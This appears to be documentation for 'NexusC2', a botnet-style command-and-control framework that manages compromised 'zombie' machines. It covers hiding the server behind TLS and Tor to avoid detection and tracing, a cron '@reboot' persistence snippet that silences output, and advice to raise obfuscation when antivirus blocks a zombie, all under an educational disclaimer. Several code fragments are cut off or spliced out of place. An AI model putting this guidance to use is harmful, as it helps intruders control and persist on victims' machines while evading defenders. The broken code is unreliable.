NexusC2 Framework

Professional command and control framework for educational purposes and penetration testing

NexusC2 is an advanced command and control framework designed for cybersecurity professionals, penetration testers, and educational environments. The framework provides a comprehensive set of tools for creating, deploying, and managing a network of client systems ("zombies") that can be controlled from a central server.

Whether you're conducting authorized security assessments, researching defense mechanisms, or learning about network security, NexusC2 provides the infrastructure you need with enterprise-grade encryption, advanced evasion capabilities, and intuitive control interfaces.

Important: This framework is intended for legitimate security research, authorized penetration testing, and educational purposes only. Unauthorized use against systems without explicit permission is illegal and unethical.

Key Management

The server generates RSA key pairs for secure communication with zombies. These keys are stored in the server_keys directory and automatically rotated based on the configured interval.

Security Tip: For production deployments, it's recommended to use a longer key rotation interval (e.g., 7 days) to balance security with operational efficiency.

Dynamic Tables for Command History

For each registered zombie, the system creates a dedicated table to store command history:

# Example of dynamic table creation for zombie command history
def registerZombie(self, zid):
    """Register a new zombie in the database"""
    # Check if the ID already exists
    if self.idExists(zid):
        return False
    
    # Add to the zombies table
    self._connection.execute("INSERT INTO zombies (id, command) VALUES (?, ?)", (zid, "idle"))
    
    # Create a table for the execution history of this particular zombie
    self._connection.execute(f"CREATE TABLE z{zid} (command TEXT, response TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
    
    self._connection.commit()
    return True

Transaction Management

The database helper implements a context manager pattern for efficient transaction handling:

# Context manager for database operations
class OpenDatabase:
    def __init__(self, database_name):
        self.database_name = database_name

    def __enter__(self):
        self.helper = DatabaseHelper(self.database_name)
        return self.helper

    def __exit__(self, exc_type, exc_value, exc_tb):

Remote Access Configuration

Securely exposing your C2 server to external networks

Access Methods Overview

NexusC2 supports multiple methods for making your server accessible from external networks, each with different security implications and use cases.

Direct IP Access

The simplest method involves binding the server to a public IP address and port. This requires proper network configuration, including port forwarding if behind a NAT.

# Configure direct IP access
python server_setup.py --ip 203.0.113.10 --port 8443
Security Notice: Direct IP access exposes your server to potential scanning and attacks. Always implement proper authentication and encryption.

Domain Name with SSL/TLS

For enhanced security, configure a domain name with SSL/TLS encryption. This provides encrypted communications and can help avoid detection by security monitoring systems.

# Configure domain access with SSL
python server_setup.py --domain your-domain.com --ssl

This configuration generates self-signed certificates by default. For production use, replace these with certificates from a trusted Certificate Authority.

Certificate Management

# Generate custom SSL certificate
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365 -subj "/CN=your-domain.com"

# Move certificates to the ssl directory
mv cert.pem key.pem ./ssl/

Tor Hidden Service

For maximum anonymity, configure the server as a Tor hidden service. This routes all traffic through the Tor network, making it difficult to trace connections back to their origin.

# Configure as Tor hidden service
python server_setup.py --tor

This configuration creates a .onion address for your service. Zombies will need the Tor client to connect, which can be integrated in the build process.

Manual Tor Configuration

To manually configure a Tor hidden service:

  1. Install Tor on your server
  2. Add the following to your torrc file:
HiddenServiceDir /path/to/NexusC2/hidden_service
HiddenServicePort 80 127.0.0.1:5000
  • Restart the Tor service
  • The onion address will be in hidden_service/hostname

    def setup_cron_persistence():
    executable_path = os.path.abspath(sys.executable)
    cron_entry = f"@reboot {executable_path} > /dev/null 2>&1\n"
    
    # Add to crontab
    try:
        existing_crontab = subprocess.check_output(["crontab", "-l"]).decode('utf-8')

    if cron_entry not in existing_crontab:

            if not existing_crontab.endswith('\n'):

        subprocess.call(["systemctl", "--user", "start", f"{service_name}.service"])

    Troubleshooting

    Common issues and solutions for the NexusC2 framework

    Server Issues

    Server Won't Start

    Symptoms: The server fails to start or crashes immediately.

    Possible Causes and Solutions:

    • Port Conflict: Another application might be using port 5000. Try using a different port with python wsgi.py --port 8080.
    • Missing Dependencies: Ensure all required packages are installed with pip install flask cryptography requests.
    • Permission Issues: Make sure you have sufficient permissions to bind to the specified port, especially if using a port number below 1024.

    Database Errors

    Symptoms: Server logs show database errors or the server crashes when performing database operations.

    Possible Causes and Solutions:

    • Corrupt Database: Try renaming or deleting the existing database file (command_control.db) and restart the server to create a new one.
    • SQLite Issues: Ensure SQLite3 is installed on your system.
    • Permission Problems: Check that the application has write permissions to the directory containing the database.

    Zombie Issues

    Zombie Build Fails

    Symptoms: The build.py script fails to produce an executable.

    Possible Causes and Solutions:

    • Missing PyInstaller: Install PyInstaller with pip install pyinstaller.
    • Missing PyArmor: Install PyArmor with pip install pyarmor.
    • Debug Output: Run the build with --debug flag to see detailed error messages.
    • Platform Issues: Ensure you're building for a compatible platform. Cross-compilation may require additional configuration.

    Zombie Not Connecting

    Symptoms: Deployed zombie doesn't appear in the active zombies list.

    Possible Causes and Solutions:

    • Network Issues: Ensure the zombie can reach the C2 server. Check firewalls and network configurations.
    • Incorrect Server URL: Verify the server URL specified during the build.
    • Anti-Virus Blocking: Security software may be blocking the zombie. Try using a higher obfuscation level.
    • Execution Environment: Make sure the zombie has the necessary permissions to run and access network resources.

    Master Control Issues

    Authentication Failures

    Symptoms: The master interface reports "Authentication failed" or "Invalid master key".

    Possible Causes and Solutions:

    • Key Mismatch: The master key in master_key.txt may not match the key in the server database. Try deleting the key file and restarting the master interface to generate a new key.
    • Server Issues: Ensure the C2 server is running and accessible.
    • Database Problems: If the server database was reset, the old master key will no longer be valid.

    Command Execution Failures

    Symptoms: Commands sent to zombies fail to execute or return results.

    Possible Causes and Solutions:

    • Zombie Status: Ensure the zombie is active and connected. Inactive zombies cannot receive commands.
    • Command Format: Check that the command syntax is correct for the target system. Remember that different operating systems have different command syntaxes.
    • Permissions: The zombie may not have sufficient permissions to execute certain commands.
    • Network Issues: Temporary network disruptions may prevent command delivery or result reporting.
